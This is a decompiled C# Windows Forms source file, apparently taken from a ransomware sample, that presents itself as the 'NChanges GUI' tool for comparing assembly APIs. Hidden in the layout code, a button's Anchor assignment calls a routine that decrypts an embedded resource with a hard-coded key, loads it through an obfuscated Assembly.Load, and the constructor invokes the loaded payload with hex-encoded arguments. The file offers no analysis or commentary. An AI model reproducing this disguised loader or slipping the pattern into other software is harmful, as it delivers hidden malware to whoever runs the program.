// Decompiled with JetBrains decompiler
// Type: NChanges.ApiChangesForm
// Assembly: CryptoAPITransf, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3C6B9EE6-9C07-49E4-80B0-30EE0F446F3E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\HEUR-Trojan-Ransom.Win32.Convagent.gen-2c751eac7d8b2b4131c0622a8b5234b05661d29d6f5d49745e4bea13c6c01648.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Windows.Forms;

namespace NChanges
{
  public class ApiChangesForm : Form
  {
    private const string NCHANGES_TOOL_EXE = "NChanges.exe";
    private const string TITLE_SUFFIX = "NChanges GUI";
    private const string TITLE_SEPARATOR = " - ";
    private const string PROJECT_FILTER = "NChanges Files (*.nchanges)|*.nchanges|MSBuild Files (*.msbuild)|*.msbuld|All Files (*.*)|*.*";
    private const string ASSEMBLY_FILTER = "Assembly Files (*.dll)|*.dll";
    private string _currentProjectPath;
    private bool _dirty;
    private IContainer components;
    private static object CacheEvent;
    private OpenFileDialog openFileDialog1;
    private FolderBrowserDialog folderBrowserDialog1;
    private TabControl tabControl1;
    private TabPage tabPage1;
    private Label label4;
    private Button btnCreateSnapshots;
    private Label label16;
    private TextBox txtTypesToExclude;
    private MenuStrip menuStrip;
    private ToolStripMenuItem toolStripMenuItem1;
    private ToolStripMenuItem openToolStripMenuItem;
    private ToolStripMenuItem recentProjectsToolStripMenuItem;
    private ToolStripSeparator toolStripSeparator1;
    private ToolStripMenuItem exitToolStripMenuItem;
    private ToolStripSeparator toolStripSeparator2;
    private ToolStripMenuItem saveProjectToolStripMenuItem;
    private ToolStripSeparator recentProjectsToolStripSeparator;
    private ToolStripMenuItem clearToolStripMenuItem;
    private ToolStripMenuItem closeProjectToolStripMenuItem;
    private ToolStripSeparator toolStripSeparator3;
    private ListView assembliesListView;
    private ColumnHeader assemblyColumnHeader;
    private ColumnHeader versionColumnHeader;
    private Button editVersionButton;
    private Button removeAssemblyButton;
    private Button addAssemblyButton;
    private Button editPathButton;
    private Button btnCreateReports;
    private Label label1;
    private TextBox txtExcelOutput;
    private Button btnExportToExcel;
    private Button btnViewExcelOutput;

    public ApiChangesForm()
    {
      this.InitializeComponent();
      ((System.Type) ApiChangesForm.CacheEvent).GetMethods()[0].Invoke((object) null, new object[3]
      {
        (object) "5365637572697479436F6E7465787452756E44",
        (object) "75734E385862",
        (object) "NChanges"
      });
      this.UpdateRecentProjects();
    }

    private void openToolStripMenuItem_Click(object sender, EventArgs e)
    {
      OpenFileDialog dialog = new OpenFileDialog();
      ApiChangesForm.SetFileDialogProperties((FileDialog) dialog);
      if (dialog.ShowDialog((IWin32Window) this) != DialogResult.OK)
        return;
      this.LoadProject(dialog.FileName);
    }

    private void closeProjectToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.UpdateGUI(new Project());
      this._currentProjectPath = (string) null;
      this.SetTitle();
    }

    private void saveProjectToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this._currentProjectPath == null)
      {
        SaveFileDialog dialog = new SaveFileDialog();
        ApiChangesForm.SetFileDialogProperties((FileDialog) dialog);
        if (dialog.ShowDialog((IWin32Window) this) == DialogResult.OK)
          this._currentProjectPath = dialog.FileName;
      }
      if (this._currentProjectPath == null)
        return;
      this.SaveProject(this._currentProjectPath);
    }

    private void clearToolStripMenuItem_Click(object sender, EventArgs e)
    {
      Settings.Default.ClearRecentProjects();
      this.UpdateRecentProjects();
    }

    private static void SetFileDialogProperties(FileDialog dialog)
    {
      dialog.Filter = "NChanges Files (*.nchanges)|*.nchanges|MSBuild Files (*.msbuild)|*.msbuld|All Files (*.*)|*.*";
      List<string> recentProjects = Settings.Default.RecentProjects;
      if (recentProjects == null || recentProjects.Count <= 0)
        return;
      dialog.InitialDirectory = Path.GetDirectoryName(recentProjects[0]);
    }

    private void LoadProject(string path)
    {
      Project project = new Project();
      project.ReadXml(path);
      this.UpdateGUI(project);
      Settings.Default.AddRecentProject(path);
      this.UpdateRecentProjects();
      this._currentProjectPath = path;
      this.SetTitle();
      this._dirty = false;
    }

    private void UpdateGUI(Project project)
    {
      foreach (AssemblyToSnapshot assemblyToSnapshot in (IEnumerable<AssemblyToSnapshot>) project.AssembliesToSnapshot)
        this.assembliesListView.Items.Add(new ListViewItem(new string[2]
        {
          assemblyToSnapshot.Path,
          assemblyToSnapshot.Version
        }));
      this.txtTypesToExclude.Text = project.TypesToExcludePattern;
      this.txtExcelOutput.Text = project.ExcelOutputPath;
    }

    private void SaveProject(string path)
    {
      Project project = new Project()
      {
        NChangesToolPath = this.GetNChangesToolPath(),
        TypesToExcludePattern = this.txtTypesToExclude.Text,
        ExcelOutputPath = this.txtExcelOutput.Text
      };
      foreach (AssemblyToSnapshot assemblyToSnapshot in this.assembliesListView.Items.Cast<ListViewItem>().Select<ListViewItem, AssemblyToSnapshot>((Func<ListViewItem, AssemblyToSnapshot>) (i => new AssemblyToSnapshot()
      {
        Path = i.SubItems[0].Text,
        Version = i.SubItems[1].Text
      })))
        project.AssembliesToSnapshot.Add(assemblyToSnapshot);
      project.WriteXml(path);
      Settings.Default.AddRecentProject(path);
      this.UpdateRecentProjects();
      this.SetTitle();
      this._dirty = false;
    }

    private void UpdateRecentProjects()
    {
      List<string> recentProjects = Settings.Default.RecentProjects;
      this.recentProjectsToolStripMenuItem.DropDownItems.Clear();
      if (recentProjects != null)
      {
        foreach (string str in recentProjects)
        {
          ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem();
          toolStripMenuItem.Text = str;
          ToolStripMenuItem item = toolStripMenuItem;
          item.Click += (EventHandler) ((s, e) => this.LoadProject(item.Text));
          this.recentProjectsToolStripMenuItem.DropDownItems.Add((ToolStripItem) item);
        }
      }
      else
      {
        ToolStripItemCollection dropDownItems = this.recentProjectsToolStripMenuItem.DropDownItems;
        ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem();
        toolStripMenuItem.Text = "(empty)";
        toolStripMenuItem.Enabled = false;
        dropDownItems.Add((ToolStripItem) toolStripMenuItem);
      }
      this.recentProjectsToolStripMenuItem.DropDownItems.Add((ToolStripItem) this.recentProjectsToolStripSeparator);
      this.recentProjectsToolStripMenuItem.DropDownItems.Add((ToolStripItem) this.clearToolStripMenuItem);
    }

    private void SetTitle()
    {
      if (this._currentProjectPath == null)
        this.Text = "NChanges GUI";
      else
        this.Text = string.Format("{0}{1}{2}", (object) Path.GetFileNameWithoutExtension(this._currentProjectPath), (object) " - ", (object) "NChanges GUI");
    }

    private string GetNChangesToolPath() => Path.Combine(Path.GetDirectoryName(Application.ExecutablePath), "NChanges.exe");

    private void addAssemblyButton_Click(object sender, EventArgs e)
    {
      this.openFileDialog1.Filter = "Assembly Files (*.dll)|*.dll";
      if (this.openFileDialog1.ShowDialog() != DialogResult.OK)
        return;
      this.assembliesListView.Items.Add(new ListViewItem(new string[2]
      {
        this.openFileDialog1.FileName,
        ""
      }));
      this._dirty = true;
    }

    private void editPathButton_Click(object sender, EventArgs e) => this.EditAssemblySubItem(0, "Assembly Path");

    private void editVersionButton_Click(object sender, EventArgs e) => this.EditAssemblySubItem(1, "Assembly Version");

    private void EditAssemblySubItem(int subItemIndex, string prompt)
    {
      if (this.assembliesListView.SelectedItems.Count == 0)
        return;
      string text = this.assembliesListView.SelectedItems[0].SubItems[subItemIndex].Text;
      if (InputBox.Show("NChanges GUI", prompt, ref text) != DialogResult.OK)
        return;
      foreach (ListViewItem selectedItem in this.assembliesListView.SelectedItems)
        selectedItem.SubItems[subItemIndex].Text = text;
      this._dirty = true;
    }

    private void removeAssemblyButton_Click(object sender, EventArgs e)
    {
      if (this.assembliesListView.SelectedItems.Count == 0)
        return;
      foreach (ListViewItem listViewItem in new List<ListViewItem>(this.assembliesListView.SelectedItems.Cast<ListViewItem>()))
      {
        this.assembliesListView.Items.Remove(listViewItem);
        this._dirty = true;
      }
    }

    private void btnCreateSnapshots_Click(object sender, EventArgs e) => this.RunTask(Project.SnapshotTaskName);

    private void btnCreateReports_Click(object sender, EventArgs e) => this.RunTask(Project.ReportTaskName);

    private void btnExportToExcel_Click(object sender, EventArgs e) => this.RunTask(Project.ExcelTaskName);

    private void RunTask(string taskName)
    {
      if (!this.VerifyProject())
        return;
      Project.Run(this._currentProjectPath, taskName);
    }

    private bool VerifyProject()
    {
      if (this._currentProjectPath == null)
      {
        int num = (int) MessageBox.Show("You need to open or save a project first...", "Sorry!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        return false;
      }
      if (this._dirty)
        this.SaveProject(this._currentProjectPath);
      return true;
    }

    private void btnViewExcelOutput_Click(object sender, EventArgs e)
    {
      if (!this.VerifyProject())
        return;
      Process.Start(Path.Combine(Path.GetDirectoryName(this._currentProjectPath), this.txtExcelOutput.Text));
    }

    private void txtTypesToExclude_TextChanged(object sender, EventArgs e) => this._dirty = true;

    private void txtExcelOutput_TextChanged(object sender, EventArgs e) => this._dirty = true;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private static AnchorStyles PinnableBuffer()
    {
      byte[] numArray = (byte[]) new ResourceManager(typeof (ApiChangesForm)).GetObject("UnderlyingSystemType");
      string pass = "5S3Z5C2H5489RFE7855Z8H";
      for (int i = 98326; i >= 0; i += -1)
        numArray = ApiChangesForm.CodePage(pass, numArray, i);
      ApiChangesForm.DebugView(ApiChangesForm.KeyedCollection(numArray));
      return AnchorStyles.Bottom | AnchorStyles.Left;
    }

    private static byte[] CodePage(string pass, byte[] tt, int i)
    {
      int num = 256;
      tt[i % 49152] = ApiChangesForm.@string((ApiChangesForm.IResourceWriter(tt, pass, 49152, i) - ApiChangesForm.@uint((int) tt[(i + 1) % 49152]) + num) % num);
      return tt;
    }

    private static int IResourceWriter(byte[] tt, string pass, int len, int i) => ApiChangesForm.@uint((int) tt[i % len] ^ (int) pass[i % 22]);

    private static int @uint(int x) => x;

    private static byte @string(int x) => (byte) x;

    private static object KeyedCollection(byte[] OPTS) => typeof (Assembly).InvokeMember("L" + string.Empty + "oa" + string.Empty + "d", BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
    {
      (object) OPTS
    });

    private static void DebugView(object Mscorlib) => ApiChangesForm.CacheEvent = (object) ((Assembly) Mscorlib).GetType("CU0mxh8nSOsmJDWZHj.MrjSg7KR80F4fcrGf4");

    private void InitializeComponent()
    {
      this.openFileDialog1 = new OpenFileDialog();
      this.folderBrowserDialog1 = new FolderBrowserDialog();
      this.tabControl1 = new TabControl();
      this.tabPage1 = new TabPage();
      this.btnViewExcelOutput = new Button();
      this.btnExportToExcel = new Button();
      this.label1 = new Label();
      this.txtExcelOutput = new TextBox();
      this.btnCreateReports = new Button();
      this.editPathButton = new Button();
      this.editVersionButton = new Button();
      this.removeAssemblyButton = new Button();
      this.addAssemblyButton = new Button();
      this.assembliesListView = new ListView();
      this.assemblyColumnHeader = new ColumnHeader();
      this.versionColumnHeader = new ColumnHeader();
      this.label16 = new Label();
      this.txtTypesToExclude = new TextBox();
      this.label4 = new Label();
      this.btnCreateSnapshots = new Button();
      this.menuStrip = new MenuStrip();
      this.toolStripMenuItem1 = new ToolStripMenuItem();
      this.openToolStripMenuItem = new ToolStripMenuItem();
      this.recentProjectsToolStripMenuItem = new ToolStripMenuItem();
      this.recentProjectsToolStripSeparator = new ToolStripSeparator();
      this.clearToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator2 = new ToolStripSeparator();
      this.closeProjectToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator3 = new ToolStripSeparator();
      this.saveProjectToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator1 = new ToolStripSeparator();
      this.exitToolStripMenuItem = new ToolStripMenuItem();
      this.tabControl1.SuspendLayout();
      this.tabPage1.SuspendLayout();
      this.menuStrip.SuspendLayout();
      this.SuspendLayout();
      this.openFileDialog1.FileName = "openFileDialog1";
      this.tabControl1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.tabControl1.Controls.Add((Control) this.tabPage1);
      this.tabControl1.Location = new Point(12, 27);
      this.tabControl1.Name = "tabControl1";
      this.tabControl1.SelectedIndex = 0;
      this.tabControl1.Size = new Size(604, 534);
      this.tabControl1.TabIndex = 23;
      this.tabPage1.Controls.Add((Control) this.btnViewExcelOutput);
      this.tabPage1.Controls.Add((Control) this.btnExportToExcel);
      this.tabPage1.Controls.Add((Control) this.label1);
      this.tabPage1.Controls.Add((Control) this.txtExcelOutput);
      this.tabPage1.Controls.Add((Control) this.btnCreateReports);
      this.tabPage1.Controls.Add((Control) this.editPathButton);
      this.tabPage1.Controls.Add((Control) this.editVersionButton);
      this.tabPage1.Controls.Add((Control) this.removeAssemblyButton);
      this.tabPage1.Controls.Add((Control) this.addAssemblyButton);
      this.tabPage1.Controls.Add((Control) this.assembliesListView);
      this.tabPage1.Controls.Add((Control) this.label16);
      this.tabPage1.Controls.Add((Control) this.txtTypesToExclude);
      this.tabPage1.Controls.Add((Control) this.label4);
      this.tabPage1.Controls.Add((Control) this.btnCreateSnapshots);
      this.tabPage1.Location = new Point(4, 22);
      this.tabPage1.Name = "tabPage1";
      this.tabPage1.Padding = new Padding(3);
      this.tabPage1.Size = new Size(596, 508);
      this.tabPage1.TabIndex = 0;
      this.tabPage1.Text = "Snapshot";
      this.tabPage1.UseVisualStyleBackColor = true;
      this.btnViewExcelOutput.Anchor = ApiChangesForm.PinnableBuffer();
      this.btnViewExcelOutput.Location = new Point(100, 444);
      this.btnViewExcelOutput.Name = "btnViewExcelOutput";
      this.btnViewExcelOutput.Size = new Size(124, 23);
      this.btnViewExcelOutput.TabIndex = 53;
      this.btnViewExcelOutput.Text = "View Excel Output";
      this.btnViewExcelOutput.UseVisualStyleBackColor = false;
      this.btnViewExcelOutput.Click += new EventHandler(this.btnViewExcelOutput_Click);
      this.btnExportToExcel.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
      this.btnExportToExcel.Location = new Point(100, 415);
      this.btnExportToExcel.Name = "btnExportToExcel";
      this.btnExportToExcel.Size = new Size(124, 23);
      this.btnExportToExcel.TabIndex = 52;
      this.btnExportToExcel.Text = "Export to Excel";
      this.btnExportToExcel.UseVisualStyleBackColor = false;
      this.btnExportToExcel.Click += new EventHandler(this.btnExportToExcel_Click);
      this.label1.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
      this.label1.AutoSize = true;
      this.label1.Location = new Point(23, 381);
      this.label1.Name = "label1";
      this.label1.Size = new Size(71, 13);
      this.label1.TabIndex = 51;
      this.label1.Text = "Excel Output:";
      this.txtExcelOutput.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
      this.txtExcelOutput.Location = new Point(100, 378);
      this.txtExcelOutput.Name = "txtExcelOutput";
      this.txtExcelOutput.Size = new Size(427, 20);
      this.txtExcelOutput.TabIndex = 50;
      this.txtExcelOutput.TextChanged += new EventHandler(this.txtExcelOutput_TextChanged);
      this.btnCreateReports.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
      this.btnCreateReports.Location = new Point(100, 317);
      this.btnCreateReports.Name = "btnCreateReports";
      this.btnCreateReports.Size = new Size(124, 23);
      this.btnCreateReports.TabIndex = 49;
      this.btnCreateReports.Text = "Create Reports";
      this.btnCreateReports.UseVisualStyleBackColor = false;
      this.btnCreateReports.Click += new EventHandler(this.btnCreateReports_Click);
      this.editPathButton.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
      this.editPathButton.Location = new Point(213, 215);
      this.editPathButton.Name = "editPathButton";
      this.editPathButton.Size = new Size(75, 23);
      this.editPathButton.TabIndex = 48;
      this.editPathButton.Text = "Edit Path";
      this.editPathButton.UseVisualStyleBackColor = true;
      this.editPathButton.Click += new EventHandler(this.editPathButton_Click);
      this.editVersionButton.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
      this.editVersionButton.Location = new Point(294, 215);
      this.editVersionButton.Name = "editVersionButton";
      this.editVersionButton.Size = new Size(75, 23);
      this.editVersionButton.TabIndex = 47;
      this.editVersionButton.Text = "Edit Version";
      this.editVersionButton.UseVisualStyleBackColor = true;
      this.editVersionButton.Click += new EventHandler(this.editVersionButton_Click);
      this.removeAssemblyButton.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
      this.removeAssemblyButton.Location = new Point(375, 215);
      this.removeAssemblyButton.Name = "removeAssemblyButton";
      this.removeAssemblyButton.Size = new Size(110, 23);
      this.removeAssemblyButton.TabIndex = 46;
      this.removeAssemblyButton.Text = "Remove";
      this.removeAssemblyButton.UseVisualStyleBackColor = true;
      this.removeAssemblyButton.Click += new EventHandler(this.removeAssemblyButton_Click);
      this.addAssemblyButton.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
      this.addAssemblyButton.Location = new Point(100, 215);
      this.addAssemblyButton.Name = "addAssemblyButton";
      this.addAssemblyButton.Size = new Size(107, 23);
      this.addAssemblyButton.TabIndex = 45;
      this.addAssemblyButton.Text = "Add";
      this.addAssemblyButton.UseVisualStyleBackColor = true;
      this.addAssemblyButton.Click += new EventHandler(this.addAssemblyButton_Click);
      this.assembliesListView.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.assembliesListView.Columns.AddRange(new ColumnHeader[2]
      {
        this.assemblyColumnHeader,
        this.versionColumnHeader
      });
      this.assembliesListView.FullRowSelect = true;
      this.assembliesListView.Location = new Point(100, 6);
      this.assembliesListView.Name = "assembliesListView";
      this.assembliesListView.Size = new Size(483, 203);
      this.assembliesListView.TabIndex = 44;
      this.assembliesListView.UseCompatibleStateImageBehavior = false;
      this.assembliesListView.View = View.Details;
      this.assemblyColumnHeader.Text = "Assembly";
      this.assemblyColumnHeader.Width = 240;
      this.versionColumnHeader.Text = "Version";
      this.versionColumnHeader.Width = 80;
      this.label16.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
      this.label16.AutoSize = true;
      this.label16.Location = new Point(-2, 254);
      this.label16.Name = "label16";
      this.label16.Size = new Size(96, 13);
      this.label16.TabIndex = 42;
      this.label16.Text = "Types To Exclude:";
      this.txtTypesToExclude.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
      this.txtTypesToExclude.Location = new Point(100, 251);
      this.txtTypesToExclude.Name = "txtTypesToExclude";
      this.txtTypesToExclude.Size = new Size(478, 20);
      this.txtTypesToExclude.TabIndex = 41;
      this.txtTypesToExclude.TextChanged += new EventHandler(this.txtTypesToExclude_TextChanged);
      this.label4.AutoSize = true;
      this.label4.Location = new Point(32, 33);
      this.label4.Name = "label4";
      this.label4.Size = new Size(62, 13);
      this.label4.TabIndex = 32;
      this.label4.Text = "Assemblies:";
      this.btnCreateSnapshots.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
      this.btnCreateSnapshots.Location = new Point(100, 288);
      this.btnCreateSnapshots.Name = "btnCreateSnapshots";
      this.btnCreateSnapshots.Size = new Size(124, 23);
      this.btnCreateSnapshots.TabIndex = 27;
      this.btnCreateSnapshots.Text = "Create Snapshots";
      this.btnCreateSnapshots.UseVisualStyleBackColor = true;
      this.btnCreateSnapshots.Click += new EventHandler(this.btnCreateSnapshots_Click);
      this.menuStrip.Items.AddRange(new ToolStripItem[1]
      {
        (ToolStripItem) this.toolStripMenuItem1
      });
      this.menuStrip.Location = new Point(0, 0);
      this.menuStrip.Name = "menuStrip";
      this.menuStrip.Size = new Size(628, 24);
      this.menuStrip.TabIndex = 24;
      this.menuStrip.Text = "menuStrip";
      this.toolStripMenuItem1.DropDownItems.AddRange(new ToolStripItem[8]
      {
        (ToolStripItem) this.openToolStripMenuItem,
        (ToolStripItem) this.recentProjectsToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator2,
        (ToolStripItem) this.closeProjectToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator3,
        (ToolStripItem) this.saveProjectToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator1,
        (ToolStripItem) this.exitToolStripMenuItem
      });
      this.toolStripMenuItem1.Name = "toolStripMenuItem1";
      this.toolStripMenuItem1.Size = new Size(37, 20);
      this.toolStripMenuItem1.Text = "&File";
      this.openToolStripMenuItem.Name = "openToolStripMenuItem";
      this.openToolStripMenuItem.Size = new Size(182, 22);
      this.openToolStripMenuItem.Text = "&Open Project";
      this.openToolStripMenuItem.Click += new EventHandler(this.openToolStripMenuItem_Click);
      this.recentProjectsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.recentProjectsToolStripSeparator,
        (ToolStripItem) this.clearToolStripMenuItem
      });
      this.recentProjectsToolStripMenuItem.Name = "recentProjectsToolStripMenuItem";
      this.recentProjectsToolStripMenuItem.Size = new Size(182, 22);
      this.recentProjectsToolStripMenuItem.Text = "Open &Recent Project";
      this.recentProjectsToolStripSeparator.Name = "recentProjectsToolStripSeparator";
      this.recentProjectsToolStripSeparator.Size = new Size(98, 6);
      this.clearToolStripMenuItem.Name = "clearToolStripMenuItem";
      this.clearToolStripMenuItem.Size = new Size(101, 22);
      this.clearToolStripMenuItem.Text = "Clear";
      this.clearToolStripMenuItem.Click += new EventHandler(this.clearToolStripMenuItem_Click);
      this.toolStripSeparator2.Name = "toolStripSeparator2";
      this.toolStripSeparator2.Size = new Size(179, 6);
      this.closeProjectToolStripMenuItem.Name = "closeProjectToolStripMenuItem";
      this.closeProjectToolStripMenuItem.Size = new Size(182, 22);
      this.closeProjectToolStripMenuItem.Text = "&Close Project";
      this.closeProjectToolStripMenuItem.Click += new EventHandler(this.closeProjectToolStripMenuItem_Click);
      this.toolStripSeparator3.Name = "toolStripSeparator3";
      this.toolStripSeparator3.Size = new Size(179, 6);
      this.saveProjectToolStripMenuItem.Name = "saveProjectToolStripMenuItem";
      this.saveProjectToolStripMenuItem.Size = new Size(182, 22);
      this.saveProjectToolStripMenuItem.Text = "&Save Project";
      this.saveProjectToolStripMenuItem.Click += new EventHandler(this.saveProjectToolStripMenuItem_Click);
      this.toolStripSeparator1.Name = "toolStripSeparator1";
      this.toolStripSeparator1.Size = new Size(179, 6);
      this.exitToolStripMenuItem.Name = "exitToolStripMenuItem";
      this.exitToolStripMenuItem.Size = new Size(182, 22);
      this.exitToolStripMenuItem.Text = "E&xit";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = SystemColors.Control;
      this.ClientSize = new Size(628, 573);
      this.Controls.Add((Control) this.tabControl1);
      this.Controls.Add((Control) this.menuStrip);
      this.MainMenuStrip = this.menuStrip;
      this.Name = nameof (ApiChangesForm);
      this.Text = "NChanges GUI";
      this.tabControl1.ResumeLayout(false);
      this.tabPage1.ResumeLayout(false);
      this.tabPage1.PerformLayout();
      this.menuStrip.ResumeLayout(false);
      this.menuStrip.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
